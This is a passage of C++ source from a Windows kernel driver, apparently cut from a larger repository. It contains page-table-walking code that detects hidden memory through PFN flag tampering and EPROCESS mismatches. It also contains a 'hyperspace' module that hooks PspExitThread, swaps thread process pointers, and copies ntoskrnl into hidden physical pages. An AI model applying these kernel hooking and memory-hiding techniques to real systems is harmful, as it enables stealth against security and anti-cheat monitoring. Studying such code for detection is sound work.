   * @param pfn_exists_flag Output flag set if PfnExists bit is cleared
   * @return Status code indicating type of hiding technique detected
   *
   * Uses MmCopyMemory to test if physical memory is accessible and analyzes
   * the failure modes to detect various memory hiding techniques including
   * parity error injection and PFN existence bit manipulation.
   */
  auto check_mmcopymemory(uintptr_t physical_address, uint8_t* parity_error_flag,
                          uint8_t* pfn_exists_flag) -> uint32_t {
    // get pfn from physical address
    uintptr_t page_frame_number = physical_address >> PAGE_SHIFT;

    // get PFN entry address
    uintptr_t pfn_entry_addr =
        *reinterpret_cast<uintptr_t*>(globals::mm_pfn_db) + 0x30 * page_frame_number;

    // get pointer to PFN entry flag fields
    auto* e3_field = reinterpret_cast<_MMPFNENTRY3*>(pfn_entry_addr + 0x23);

    // check ParityError flag
    if (e3_field->ParityError) {
      log("INFO", "ParityError set for PFN: 0x%llx", page_frame_number);

      *parity_error_flag = 1;

      return STATUS_PARITY_ERROR_SET;
    }

    // check if we can read the physical memory using MmCopyMemory
    uintptr_t test_value = 0;
    size_t bytes_read = 0;
    MM_COPY_ADDRESS source;
    source.PhysicalAddress.QuadPart = physical_address;

    // attempt to copy memory from the physical address
    NTSTATUS copy_status = globals::mm_copy_memory(&test_value, source, sizeof(test_value),
                                                   MM_COPY_MEMORY_PHYSICAL, &bytes_read);

    if (!NT_SUCCESS(copy_status)) {
      log("INFO", "MmCopyMemory failed for PA: 0x%llx with status: 0x%X", physical_address,
          copy_status);
      if (copy_status == STATUS_INVALID_ADDRESS) {
        *pfn_exists_flag = 1;

        return STATUS_PFN_EXISTS_NOT_SET;
      } else if (copy_status == STATUS_HARDWARE_MEMORY_ERROR) {
        *parity_error_flag = 1;

        return STATUS_PARITY_ERROR_SET;
      } else {
        // should probably add a flag if it returns some other NTSTATUS error
        *pfn_exists_flag = 1;
        return STATUS_COPY_FAILED;
      }
    }

    return STATUS_OK;
  }

  /**
   * @brief Add a detection result entry to the global results array
   * @param va Virtual address of the suspicious page
   * @param pa Physical address of the suspicious page
   * @param parity_error_flag Flag indicating parity error detection
   * @param pfn_exists_flag Flag indicating PfnExists bit manipulation
   * @param supervisor_flag Flag indicating supervisor bit anomaly
   * @param no_associated_eprocess_flag Flag indicating EPROCESS mismatch
   * @return TRUE if entry was added successfully, FALSE if buffer is full
   *
   * Records suspicious page table entries in the global results array for
   * later analysis and reporting.
   */
  auto add_entry(uintptr_t va, uintptr_t pa, uint8_t parity_error_flag, uint8_t pfn_exists_flag,
                 uint8_t supervisor_flag, uint8_t no_associated_eprocess_flag) -> bool {
    // check if we have space
    if (g_result_count >= MAX_RESULTS) {
      log("ERROR", "result buffer full, cannot add more entries");
      return false;
    }

    g_results[g_result_count].virtual_address = va;
    g_results[g_result_count].physical_address = pa;
    g_results[g_result_count].parity_error_flag = parity_error_flag;
    g_results[g_result_count].pfn_exists_flag = pfn_exists_flag;
    g_results[g_result_count].supervisor_flag = supervisor_flag;
    g_results[g_result_count].no_associated_eprocess_flag = no_associated_eprocess_flag;
    g_result_count++;

    return true;
  }

  /**
   * @brief Walk all page table entries starting from PML4 level
   * @param dir_base Physical address of the PML4 table (CR3 value)
   * @return NTSTATUS indicating success or failure of the walk operation
   *
   * Master function that performs a complete page table walk across all levels.
   * Iterates through all 512 PML4 entries for both user and kernel space,
   * delegating to lower-level walk functions for detailed analysis.
   */
  auto walk_all_page_tables(uintptr_t dir_base) -> NTSTATUS {
    NTSTATUS status = STATUS_SUCCESS;

    // reset the result counter
    g_result_count = 0;

    log("INFO", "starting full page table walk from dir_base 0x%llx", dir_base);
    log("DEBUG", "PML4 level scan started");
    uint32_t pml4_read_count = 0;
    uint32_t pml4_present_count = 0;

    // walk through all 512 PML4 entries
    for (uint32_t pml4_idx = 0; pml4_idx < 512; pml4_idx++) {
      PML4E_64 pml4e = {0};

      // calculate the virtual address for this PT entry
      uintptr_t va = 0;
      if (pml4_idx >= 256) {
        // kernel space
        va = 0xFFFF000000000000ULL | page_table::get_pml4e(pml4_idx);
      } else {
        // user space
        va = page_table::get_pml4e(pml4_idx);
      }

      // try to read the PML4 entry
      if (!NT_SUCCESS(physical::read_physical_address(dir_base + pml4_idx * sizeof(PML4E_64),
                                                      &pml4e, sizeof(PML4E_64)))) {
        continue;
      }

      pml4_read_count++;

      // skip if not present
      if (!pml4e.Present) {
        continue;
      }

      pml4_present_count++;

      // check if pte frame contains eprocess anomalies
      uintptr_t pml4_phys_addr = dir_base + pml4_idx * sizeof(PML4E_64);

      uint8_t no_associated_eprocess_flag = 0;
      uint32_t status_check_pte_frame =
          check_pte_frame(pml4_phys_addr, &no_associated_eprocess_flag);

      if (status_check_pte_frame != STATUS_OK) {
        if (!add_entry(va, pml4_phys_addr, 0, 0, 0, no_associated_eprocess_flag)) {
          log("ERROR", "result buffer full at PML4=%u", pml4_idx);
          return STATUS_BUFFER_TOO_SMALL;
        }
      }

      // get physical address from PFN
      uintptr_t pdpt_phys_addr = PFN_TO_PAGE(pml4e.PageFrameNumber);

      // explore the PDPT level for this PML4 entry
      status = walk_pdpt(pdpt_phys_addr, pml4_idx);
      if (!NT_SUCCESS(status)) {
        log("ERROR", "failed to walk PDPT at PML4 index %u, status: 0x%08X", pml4_idx, status);
        return status;
      }
    }

    log("DEBUG", "PML4 level scan: read %u entries, %u were present", pml4_read_count,
        pml4_present_count);
    log("INFO", "completed full page table walk, found %u PTE entries", g_result_count);
    return STATUS_SUCCESS;
  }

  /**
   * @brief Walk Page Directory Pointer Table entries for a given PML4 entry
   * @param pdpt_base Physical address of the PDPT
   * @param pml4_idx Index of the parent PML4 entry
   * @return NTSTATUS indicating success or failure
   *
   * Iterates through all 512 PDPTE entries, skipping 1GB large pages,
   * and delegates to PD-level walking for standard 4KB page mappings.
   */
  auto walk_pdpt(uintptr_t pdpt_base, uint32_t pml4_idx) -> NTSTATUS {
    uint32_t pdpt_read_count = 0;
    uint32_t pdpt_present_count = 0;

    for (uint32_t pdpt_idx = 0; pdpt_idx < 512; pdpt_idx++) {
      PDPTE_64 pdpte = {0};

      // try to read the PDPT entry
      if (!NT_SUCCESS(physical::read_physical_address(pdpt_base + pdpt_idx * sizeof(PDPTE_64),
                                                      &pdpte, sizeof(PDPTE_64)))) {
        continue;
      }

      pdpt_read_count++;

      // skip if not present
      if (!pdpte.Present) {
        continue;
      }

      pdpt_present_count++;

      // skip if large page (1GB)
      if (pdpte.LargePage) {
        continue;
      }

      // get physical address from PFN
      uintptr_t pd_phys_addr = PFN_TO_PAGE(pdpte.PageFrameNumber);

      // explore the PD level for this PDPT entry
      NTSTATUS status = walk_pd(pd_phys_addr, pml4_idx, pdpt_idx);
      if (!NT_SUCCESS(status)) {
        log("ERROR", "failed to walk PD at PDPT index %u, status: 0x%08X", pdpt_idx, status);
        return status;
      }
    }

    if (pdpt_read_count > 0) {
      log("DEBUG", "PDPT level scan for PML4 idx %u: read %u entries, %u were present", pml4_idx,
          pdpt_read_count, pdpt_present_count);
    }

    return STATUS_SUCCESS;
  }

  /**
   * @brief Walk Page Directory entries for a given PDPTE
   * @param pd_base Physical address of the Page Directory
   * @param pml4_idx Index of the parent PML4 entry
   * @param pdpt_idx Index of the parent PDPTE entry
   * @return NTSTATUS indicating success or failure
   *
   * Iterates through all 512 PDE entries, skipping 2MB large pages,
   * and delegates to PT-level walking for standard 4KB page mappings.
   */
  auto walk_pd(uintptr_t pd_base, uint32_t pml4_idx, uint32_t pdpt_idx) -> NTSTATUS {
    uint32_t pd_read_count = 0;
    uint32_t pd_present_count = 0;

    for (uint32_t pd_idx = 0; pd_idx < 512; pd_idx++) {
      PDE_64 pde = {0};

      // try to read the PD entry
      if (!NT_SUCCESS(physical::read_physical_address(pd_base + pd_idx * sizeof(PDE_64), &pde,
                                                      sizeof(PDE_64)))) {
        continue;
      }

      pd_read_count++;

      // skip if not present
      if (!pde.Present) {
        continue;
      }

      pd_present_count++;

      // skip if large page (2MB)
      if (pde.LargePage) {
        continue;
      }

      // get physical address from PFN
      uintptr_t pt_phys_addr = PFN_TO_PAGE(pde.PageFrameNumber);

      // explore the PT level for this PD entry
      NTSTATUS status = walk_pt(pt_phys_addr, pml4_idx, pdpt_idx, pd_idx);
      if (!NT_SUCCESS(status)) {
        log("ERROR", "Failed to walk PT at PD index %u, status: 0x%08X", pd_idx, status);
        return status;
      }
    }

    if (pd_read_count > 0) {
      log("DEBUG",
          "PD level scan for PML4 idx %u, PDPT idx %u: Read %u entries, %u were "
          "present",
          pml4_idx, pdpt_idx, pd_read_count, pd_present_count);
    }

    return STATUS_SUCCESS;
  }

  /**
   * @brief Walk Page Table entries and perform detailed security analysis
   * @param pt_base Physical address of the Page Table
   * @param pml4_idx Index of the parent PML4 entry
   * @param pdpt_idx Index of the parent PDPTE entry
   * @param pd_idx Index of the parent PDE entry
   * @return NTSTATUS indicating success or failure
   *
   * Performs the core detection logic by examining individual PTEs for
   * suspicious characteristics including executable supervisor pages,
   * memory hiding techniques, and EPROCESS ownership anomalies.
   */
  auto walk_pt(uintptr_t pt_base, uint32_t pml4_idx, uint32_t pdpt_idx, uint32_t pd_idx)
      -> NTSTATUS {
    uint32_t pt_read_count = 0;
    uint32_t pt_present_count = 0;
    uint32_t pt_executable_count = 0;
    uint32_t pt_supervisor_count = 0;

    for (uint32_t pt_idx = 0; pt_idx < 512; pt_idx++) {
      PTE_64 pte = {0};

      // calculate the virtual address for this PT entry
      uintptr_t va = 0;
      if (pml4_idx >= 256) {
        // kernel space
        va = 0xFFFF000000000000ULL | page_table::get_pml4e(pml4_idx) |
             page_table::get_pdpt(pdpt_idx) | page_table::get_pd(pd_idx) |
             page_table::get_pt(pt_idx);
      } else {
        // user space
        va = page_table::get_pml4e(pml4_idx) | page_table::get_pdpt(pdpt_idx) |
             page_table::get_pd(pd_idx) | page_table::get_pt(pt_idx);
      }

      // try to read the PT entry
      if (!NT_SUCCESS(physical::read_physical_address(pt_base + pt_idx * sizeof(PTE_64), &pte,
                                                      sizeof(PTE_64)))) {
        continue;
      }

      pt_read_count++;

      // skip if not present
      if (!pte.Present) {
        continue;
      }

      pt_present_count++;

      // skip if ExecuteDisable
      if (pte.ExecuteDisable) {
        continue;
      }

      pt_executable_count++;

      // skip if not supervisor bit (we only want to check pages with
      // Supervisor=1)
      if (!pte.Supervisor) {
        continue;
      }

      pt_supervisor_count++;

      // get physical address from PFN
      uintptr_t phys_addr = PFN_TO_PAGE(pte.PageFrameNumber);

      // check if in kernel space and Supervisor bit is set
      uint8_t supervisor_flag = 0;
      if (pml4_idx >= 256) {
        supervisor_flag = 1;  // kernel space with supervisor might be a problem
      }

      // check if physical memory can be read and if it has parity error
      uint8_t parity_error_flag = 0;
      uint8_t pfn_exists_flag = 0;
      uint8_t no_associated_eprocess_flag = 0;
      uint32_t status_mmcopymemory =
          check_mmcopymemory(phys_addr, &parity_error_flag, &pfn_exists_flag);

      if (status_mmcopymemory != STATUS_OK) {
        if (!add_entry(va, phys_addr, parity_error_flag, pfn_exists_flag, supervisor_flag,
                       no_associated_eprocess_flag)) {
          log("ERROR", "result buffer full at PML4=%u, PDPT=%u, PD=%u, PT=%u", pml4_idx, pdpt_idx,
              pd_idx, pt_idx);
          return STATUS_BUFFER_TOO_SMALL;
        }
      }
    }

    if (pt_read_count > 0 && pt_supervisor_count > 0) {
      log("DEBUG",
          "PT level scan for PML4 idx %u, PDPT idx %u, PD idx %u: read %u "
          "entries, %u were present, %u were executable, %u were supervisor",
          pml4_idx, pdpt_idx, pd_idx, pt_read_count, pt_present_count, pt_executable_count,
          pt_supervisor_count);
    }

    return STATUS_SUCCESS;
  }

  /**
   * @brief Analyze and report statistics from the page table walk results
   *
   * Processes the global results array to generate comprehensive statistics
   * about detected anomalies including hiding technique counts, address space
   * distribution, and detailed examples of suspicious entries for investigation.
   */
  auto analyze_page_table_results() -> void {
    uint32_t pfn_parity_flag_entries = 0;
    uint32_t pfn_exists_flag_entries = 0;
    uint32_t supervisor_bit_entries = 0;
    uint32_t no_associated_eprocess_flag_entries = 0;
    uint32_t kernel_entries = 0;
    uint32_t user_entries = 0;

    // ensure we don't divide by zero if no entries were found
    if (g_result_count == 0) {
      log("INFO", "=== page table walk report ===");
      log("INFO", "no entries found to analyze");
      return;
    }

    for (uint32_t i = 0; i < g_result_count; i++) {
      if (g_results[i].virtual_address & 0xFFFF000000000000ULL) {
        kernel_entries++;
      } else {
        user_entries++;
      }

      if (g_results[i].parity_error_flag) {
        pfn_parity_flag_entries++;
      }
      if (g_results[i].pfn_exists_flag) {
        pfn_exists_flag_entries++;
      }
      if (g_results[i].supervisor_flag) {
        supervisor_bit_entries++;
      }
      if (g_results[i].no_associated_eprocess_flag) {
        no_associated_eprocess_flag_entries++;
      }
    }

    log("INFO", "=== page table walk report ===");
    log("INFO", "total executable supervisor PTE entries: %u", g_result_count);
    log("INFO", "kernel space entries: %u", kernel_entries);
    log("INFO", "user space entries: %u", user_entries);
    log("INFO", "entries with PFN ParityError flag set: %u", pfn_parity_flag_entries);
    log("INFO", "entries with PFN PfnExists flag not set: %u", pfn_exists_flag_entries);
    log("INFO", "kernel entries with Supervisor bit incorrectly set: %u", supervisor_bit_entries);
    log("INFO", "entries with mismatching or null EPROCESS in MMPFN.u4.PteFrame: %u",
        no_associated_eprocess_flag_entries);

    // log first few entries with PFN parity error flags for investigation
    if (pfn_parity_flag_entries > 0) {
      log("INFO", "PFN ParityError examples:");
      uint32_t count = 0;
      for (uint32_t j = 0; j < g_result_count; j++) {
        if (g_results[j].parity_error_flag) {
          log("INFO", "  VA=0x%llx, PA=0x%llx", g_results[j].virtual_address,
              g_results[j].physical_address);
          if (++count >= 100)
            break;  // limit to 100 examples
        }
      }
    }

    // log first few entries with PFN exists flags not set for investigation
    if (pfn_exists_flag_entries > 0) {
      log("INFO", "PFN PfnExists examples:");
      uint32_t count = 0;
      for (uint32_t j = 0; j < g_result_count; j++) {
        if (g_results[j].pfn_exists_flag) {
          log("INFO", "  VA=0x%llx, PA=0x%llx", g_results[j].virtual_address,
              g_results[j].physical_address);
          if (++count >= 100)
            break;  // limit to 100 examples
        }
      }
    }

    // log first few entries with PFN exists flags not set for investigation
    if (no_associated_eprocess_flag_entries > 0) {
      log("INFO", "mismatching EPROCESS examples:");
      uint32_t count = 0;
      for (uint32_t j = 0; j < g_result_count; j++) {
        if (g_results[j].no_associated_eprocess_flag) {
          log("INFO", "  VA=0x%llx, PA=0x%llx", g_results[j].virtual_address,
              g_results[j].physical_address);
          if (++count >= 100)
            break;  // limit to 100 examples
        }
      }
    }
  }

  /**
   * @brief Main entry point for process page table security inspection
   * @param process_id Process ID to analyze
   * @return NTSTATUS indicating overall success or failure
   *
   * Coordinates the complete page table security analysis for a target process.
   * Looks up the process, obtains its directory base, performs the full walk,
   * and generates a comprehensive security report of potential threats.
   */
  auto inspect_process_page_tables(uint32_t process_id) -> NTSTATUS {
    PEPROCESS process;

    auto status = globals::ps_lookup_process_by_process_id((HANDLE)process_id, &process);
    if (!NT_SUCCESS(status)) {
      log("ERROR", "failed to lookup process with ID %u, status: 0x%08X", process_id, status);
      return status;
    }

    globals::proc = process;

    // get target process directory base
    const auto dir_base = physical::get_process_directory_base(process);
    if (!dir_base) {
      log("ERROR", "invalid directory base: 0x%llx", dir_base);
      globals::obf_dereference_object(process);
      return STATUS_INVALID_PARAMETER;
    }

    log("INFO", "process %u has directory base 0x%llx", process_id, dir_base);

    // perform the full page table walk
    status = walk_all_page_tables(dir_base);

    if (NT_SUCCESS(status)) {
      // analysze and report the results
      analyze_page_table_results();
    } else {
      log("ERROR", "failed to walk page tables, status: 0x%08X", status);
    }

    globals::obf_dereference_object(process);
    return status;
  }
}  // namespace detections
```

`driver/mem/detection.hpp`:

```hpp
#pragma once

namespace detections {

  /**
   * @brief Check if a page table entry frame (MMPFN.u4.PteFrame) has mismatching
   * EPROCESS ownership
   * @param physical_address Physical address of the page frame to check
   * @param no_associated_eprocess_flag Output flag set if EPROCESS mismatch
   * detected
   * @return STATUS_OK if ownership matches, STATUS_MISMATCHING_EPROCESS otherwise
   *
   * Validates that the EPROCESS associated with a page frame number matches the
   * expected target process. Detects usage of pages that don't belong to the
   * process.
   */
  auto check_pte_frame(uintptr_t physical_address, uint8_t* no_associated_eprocess_flag)
      -> uint32_t;

  /**
   * @brief Test physical memory accessibility and check for stealth hiding flags
   * @param physical_address Physical address to test
   * @param parity_error_flag Output flag set if parity error detected
   * @param pfn_exists_flag Output flag set if PfnExists bit is cleared
   * @return Status code indicating type of hiding technique detected
   *
   * Uses MmCopyMemory to test if physical memory is accessible and analyzes
   * the failure modes to detect various memory hiding techniques including
   * parity error injection and PFN existence bit manipulation.
   */
  auto check_mmcopymemory(uintptr_t physical_address, uint8_t* parity_error_flag,
                          uint8_t* pfn_exists_flag) -> uint32_t;

  /**
   * @brief Add a detection result entry to the global results array
   * @param va Virtual address of the suspicious page
   * @param pa Physical address of the suspicious page
   * @param parity_error_flag Flag indicating parity error detection
   * @param pfn_exists_flag Flag indicating PfnExists bit manipulation
   * @param supervisor_flag Flag indicating supervisor bit anomaly
   * @param no_associated_eprocess_flag Flag indicating EPROCESS mismatch
   * @return TRUE if entry was added successfully, FALSE if buffer is full
   *
   * Records suspicious page table entries in the global results array for
   * later analysis and reporting.
   */
  auto add_entry(uintptr_t va, uintptr_t pa, uint8_t parity_error_flag, uint8_t pfn_exists_flag,
                 uint8_t supervisor_flag, uint8_t no_associated_eprocess_flag) -> bool;

  /**
   * @brief Walk all page table entries starting from PML4 level
   * @param dir_base Physical address of the PML4 table (CR3 value)
   * @return NTSTATUS indicating success or failure of the walk operation
   *
   * Master function that performs a complete page table walk across all levels.
   * Iterates through all 512 PML4 entries for both user and kernel space,
   * delegating to lower-level walk functions for detailed analysis.
   */
  auto walk_all_page_tables(uintptr_t dir_base) -> NTSTATUS;

  /**
   * @brief Walk Page Directory Pointer Table entries for a given PML4 entry
   * @param pdpt_base Physical address of the PDPT
   * @param pml4_idx Index of the parent PML4 entry
   * @return NTSTATUS indicating success or failure
   *
   * Iterates through all 512 PDPTE entries, skipping 1GB large pages,
   * and delegates to PD-level walking for standard 4KB page mappings.
   */
  auto walk_pdpt(uintptr_t pdpt_base, uint32_t pml4_idx) -> NTSTATUS;

  /**
   * @brief Walk Page Directory entries for a given PDPTE
   * @param pd_base Physical address of the Page Directory
   * @param pml4_idx Index of the parent PML4 entry
   * @param pdpt_idx Index of the parent PDPTE entry
   * @return NTSTATUS indicating success or failure
   *
   * Iterates through all 512 PDE entries, skipping 2MB large pages,
   * and delegates to PT-level walking for standard 4KB page mappings.
   */
  auto walk_pd(uintptr_t pd_base, uint32_t pml4_idx, uint32_t pdpt_idx) -> NTSTATUS;

  /**
   * @brief Walk Page Table entries and perform detailed security analysis
   * @param pt_base Physical address of the Page Table
   * @param pml4_idx Index of the parent PML4 entry
   * @param pdpt_idx Index of the parent PDPTE entry
   * @param pd_idx Index of the parent PDE entry
   * @return NTSTATUS indicating success or failure
   *
   * Performs the core detection logic by examining individual PTEs for
   * suspicious characteristics including executable supervisor pages,
   * memory hiding techniques, and EPROCESS ownership anomalies.
   */
  auto walk_pt(uintptr_t pt_base, uint32_t pml4_idx, uint32_t pdpt_idx, uint32_t pd_idx)
      -> NTSTATUS;

  /**
   * @brief Analyze and report statistics from the page table walk results
   *
   * Processes the global results array to generate comprehensive statistics
   * about detected anomalies including hiding technique counts, address space
   * distribution, and detailed examples of suspicious entries for investigation.
   */
  auto analyze_page_table_results() -> void;

  /**
   * @brief Main entry point for process page table security inspection
   * @param process_id Process ID to analyze
   * @return NTSTATUS indicating overall success or failure
   *
   * Coordinates the complete page table security analysis for a target process.
   * Looks up the process, obtains its directory base, performs the full walk,
   * and generates a comprehensive security report of potential threats.
   */
  auto inspect_process_page_tables(uint32_t process_id) -> NTSTATUS;
}  // namespace detections
```

`driver/mem/hyperspace.cpp`:

```cpp
#pragma once
#include "../def/globals.hpp"
#include "mem.hpp"
#include "phys.hpp"
#include "page_table.hpp"
#include "validation.hpp"
#include "pt_hook.hpp"
#include "../utils/raii.hpp"
namespace hyperspace {

  extern ntoskrnl_mapping_info g_ntoskrnl_copy_info = {0};
  extern pt_hook::hook_info g_pspexit_hook = {0};

  /**
   * @brief Hook handler for PspExitThread to restore process context on thread
   * exit
   * @param a1 Thread exit parameter
   * @return Result from original PspExitThread function
   *
   * Intercepts thread exits in hyperspace context and restores the original
   * process references before calling the original function to prevent crashes
   * and maintain stability.
   */
  __int64 __fastcall PspExitThread(unsigned int a1) {
    // get the original function from our hook info
    typedef __int64(__fastcall * PspExitThread_t)(unsigned int);
    auto original_func = reinterpret_cast<PspExitThread_t>(g_pspexit_hook.original_function);

    auto current_thread = KeGetCurrentThread();

    // check if this thread belongs to our hyperspace context
    PEPROCESS apcstate_process = *reinterpret_cast<PEPROCESS*>(
        reinterpret_cast<uintptr_t>(current_thread) + globals::_kthread_apcstate_pkprocess);

    PEPROCESS kthread_process = *reinterpret_cast<PEPROCESS*>(
        reinterpret_cast<uintptr_t>(current_thread) + globals::_kthread_pkprocess);

    if (apcstate_process != globals::ctx.orig_peproc &&
        kthread_process == globals::ctx.orig_peproc) {
      log("INFO", "PspExitThread called for hyperspace thread, restoring "
                  "original process");

      // restore the original process before exit
      InterlockedExchangePointer(
          reinterpret_cast<PVOID*>(reinterpret_cast<uintptr_t>(current_thread) +
                                   globals::_kthread_apcstate_pkprocess),
          globals::ctx.orig_peproc);

      InterlockedExchangePointer(
          reinterpret_cast<PVOID*>(reinterpret_cast<uintptr_t>(current_thread) +
                                   globals::_kthread_pkprocess),
          globals::ctx.orig_peproc);
    }

    // call the original function
    if (original_func) {
      return original_func(a1);
    }
  }

  /**
   * @brief Initialize page tracking system for ntoskrnl copy operations
   * @return true if initialization succeeded, false otherwise
   *
   * Allocates memory for tracking physical pages used in ntoskrnl copying.
   * Maintains an array of allocated page addresses for proper cleanup.
   */
  auto initialize_page_tracking() -> bool {
    g_ntoskrnl_copy_info.allocated_pages_capacity = 10240;
    g_ntoskrnl_copy_info.allocated_pages =
        reinterpret_cast<uintptr_t*>(mem::allocate_independent_pages(
            g_ntoskrnl_copy_info.allocated_pages_capacity * sizeof(uintptr_t)));

    if (!g_ntoskrnl_copy_info.allocated_pages) {
      log("ERROR", "failed to allocate page tracking array");
      return false;
    }

    g_ntoskrnl_copy_info.allocated_pages_count = 0;
    globals::memset(g_ntoskrnl_copy_info.allocated_pages, 0,
                    g_ntoskrnl_copy_info.allocated_pages_capacity * sizeof(uintptr_t));

    log("INFO", "initialized page tracking with capacity %zu",
        g_ntoskrnl_copy_info.allocated_pages_capacity);
    return true;
  }

  /**
   * @brief Add a virtual address to the page tracking array
   * @param va Virtual address of the allocated page
   * @return true if page was successfully tracked, false if array is full
   *
   * Records allocated pages for later cleanup. Essential for preventing memory
   * leaks when tearing down the hyperspace context.
   */
  auto add_tracked_page(uintptr_t va) -> bool {
    if (g_ntoskrnl_copy_info.allocated_pages_count >=
        g_ntoskrnl_copy_info.allocated_pages_capacity) {
      log("ERROR", "page tracking array full");
      return false;
    }

    long index = InterlockedIncrement(&g_ntoskrnl_copy_info.allocated_pages_count) - 1;
    if (index >= g_ntoskrnl_copy_info.allocated_pages_capacity) {
      InterlockedDecrement(&g_ntoskrnl_copy_info.allocated_pages_count);
      return false;
    }

    InterlockedExchangePointer(
        reinterpret_cast<void**>(&g_ntoskrnl_copy_info.allocated_pages[index]),
        reinterpret_cast<void*>(va));

    return true;
  }

  /**
   * @brief Locate ntoskrnl.exe in the loaded module list
   * @param base Output parameter for ntoskrnl base address
   * @param size Output parameter for ntoskrnl image size
   * @return true if ntoskrnl was found, false otherwise
   *
   * Searches PsLoadedModuleList to find the kernel image and retrieve its
   * base address and size for copying operations.
   */
  auto find_ntoskrnl_info(uintptr_t* base, uintptr_t* size) -> bool {
    PLIST_ENTRY module_list = reinterpret_cast<PLIST_ENTRY>(globals::ps_loaded_module_list);
    if (!module_list) {
      log("ERROR", "PsLoadedModuleList not found");
      return false;
    }

    for (PLIST_ENTRY entry = module_list->Flink; entry != module_list; entry = entry->Flink) {
      PKLDR_DATA_TABLE_ENTRY ldr_entry =
          CONTAINING_RECORD(entry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

      if (ldr_entry->BaseDllName.Buffer &&
          globals::_wcsicmp(ldr_entry->BaseDllName.Buffer, L"ntoskrnl.exe") == 0) {
        *base = reinterpret_cast<uintptr_t>(ldr_entry->DllBase);
        *size = ldr_entry->SizeOfImage;

        log("SUCCESS", "found ntoskrnl.exe at 0x%llx, size: 0x%llx", *base, *size);
        return true;
      }
    }

    log("ERROR", "ntoskrnl.exe not found in module list");
    return false;
  }

  /**
   * @brief Allocate and track a single physical page with hiding applied
   * @return Physical address of allocated page, or 0 on failure
   *
   * Combines page allocation, zeroing, physical address translation, and tracking
   * into a single operation for use in page table construction.
   */
  auto allocate_tracked_physical_page() -> uintptr_t {
    void* va = mem::allocate_independent_pages(PAGE_SIZE);
    if (!va) {
      log("ERROR", "failed to allocate physical page");
      return 0;
    }

    uintptr_t pa = page_table::virtual_to_physical(va).QuadPart;
    if (!pa) {
      log("ERROR", "failed to get physical address");
      return 0;
    }

    // track the allocation
    if (!add_tracked_page(reinterpret_cast<uintptr_t>(va))) {
      log("ERROR", "failed to track allocated page");
      return 0;
    }

    log("INFO", "allocated tracked physical page: PA=0x%llx, VA=0x%llx", pa,
        reinterpret_cast<uintptr_t>(va));
    return pa;
  }

  /**
   * @brief Copy ntoskrnl image to new physical pages using 4KB page granularity
   * @param src_base Source virtual address of ntoskrnl
   * @param size Size of ntoskrnl image in bytes
   * @param dest_pd_pa Physical address of destination page directory
   * @return true if copying succeeded, false otherwise
   *
   * Creates a complete physical copy of the kernel image using individual 4KB
   * pages with proper hiding techniques applied to each page.
   */
  auto copy_ntoskrnl_pages(uintptr_t src_base, uintptr_t size, uintptr_t dest_pd_pa) -> bool {
    log("INFO", "copying ntoskrnl as 4KB pages");

    size_t page_count = (size + PAGE_SIZE - 1) / PAGE_SIZE;
    size_t page_pas_size = page_count * sizeof(uintptr_t);

    // use RAII for page_pas array
    raii::kernel_memory page_pas_mem(page_pas_size);
    if (!page_pas_mem.is_valid()) {
      log("ERROR", "failed to allocate page_pas array");
      return false;
    }

    uintptr_t* page_pas = reinterpret_cast<uintptr_t*>(page_pas_mem.get());

    for (size_t i = 0; i < page_count; i++) {
      uintptr_t src_va = src_base + (i * PAGE_SIZE);

      uintptr_t dest_pa = allocate_tracked_physical_page();
      if (!dest_pa) {
        log("ERROR", "failed to allocate page %zu", i);
        return false;
      }

      page_pas[i] = dest_pa;

      // use RAII for temporary buffer
      raii::kernel_memory temp_buffer(PAGE_SIZE);
      if (!temp_buffer.is_valid()) {
        log("ERROR", "failed to allocate temp buffer for page %zu", i);
        return false;
      }

      globals::memcpy(temp_buffer.get(), reinterpret_cast<void*>(src_va), PAGE_SIZE);

      NTSTATUS write_status =
          physical::write_physical_address(dest_pa, temp_buffer.get(), PAGE_SIZE);

      if (!NT_SUCCESS(write_status)) {
        log("ERROR", "failed to write to physical page 0x%llx", dest_pa);
        return false;
      }

      if (i % 100 == 0) {
        log("INFO", "copied page %zu from 0x%llx to PA 0x%llx", i, src_va, dest_pa);
      }
    }

    log("SUCCESS", "copied all %zu pages", page_count);
    return true;
  }

  /**
   * @brief Create page table hierarchy for ntoskrnl mapping in hyperspace
   * @param hyperspace_pml4_pa Physical address of hyperspace PML4
   * @param info Pointer to mapping information structure
   * @return true if page tables were created successfully, false otherwise
   *
   * Constructs PML4E->PDPTE->PDE hierarchy needed to map the copied ntoskrnl
   * at the same virtual address in hyperspace context.
   */
  auto create_ntoskrnl_page_tables(uintptr_t hyperspace_pml4_pa, ntoskrnl_mapping_info* info)
      -> bool {
    // parse virtual address indices
    info->pml4_index = (info->hyperspace_base >> 39) & 0x1FF;
    info->pdpt_index = (info->hyperspace_base >> 30) & 0x1FF;
    info->pd_index = (info->hyperspace_base >> 21) & 0x1FF;

    log("INFO", "creating page tables: PML4[%u] -> PDPT[%u] -> PD[%u]", info->pml4_index,
        info->pdpt_index, info->pd_index);

    // check if PML4E exists
    PML4E_64 pml4e = {0};
    uintptr_t pml4e_pa = hyperspace_pml4_pa + info->pml4_index * 8;
    if (!NT_SUCCESS(physical::read_physical_address(pml4e_pa, &pml4e, sizeof(pml4e)))) {
      log("ERROR", "failed to read PML4E");
      return false;
    }

    uintptr_t pdpt_pa;
    if (!pml4e.Present) {
      // alloc new PDPT
      pdpt_pa = allocate_tracked_physical_page();
      if (!pdpt_pa) {
        log("ERROR", "failed to allocate PDPT");
        return false;
      }

      // create PML4E
      pml4e.Present = 1;
      pml4e.Write = 1;
      pml4e.Supervisor = 0;
      pml4e.PageFrameNumber = PAGE_TO_PFN(pdpt_pa);

      if (!NT_SUCCESS(physical::write_physical_address(pml4e_pa, &pml4e, sizeof(pml4e)))) {
        log("ERROR", "failed to write PML4E");
        return false;
      }

      info->new_pdpt_pa = pdpt_pa;
      log("INFO", "created new PDPT at PA 0x%llx", pdpt_pa);
    } else {
      pdpt_pa = PFN_TO_PAGE(pml4e.PageFrameNumber);
      log("INFO", "using existing PDPT at PA 0x%llx", pdpt_pa);
    }

    // check if PDPTE exists
    PDPTE_64 pdpte = {0};
    uintptr_t pdpte_pa = pdpt_pa + info->pdpt_index * 8;
    if (!NT_SUCCESS(physical::read_physical_address(pdpte_pa, &pdpte, sizeof(pdpte)))) {
      log("ERROR", "failed to read PDPTE");
      return false;
    }

    uintptr_t pd_pa;
    if (!pdpte.Present) {
      // alloc new PD
      pd_pa = allocate_tracked_physical_page();
      if (!pd_pa) {
        log("ERROR", "failed to allocate PD");
        return false;
      }

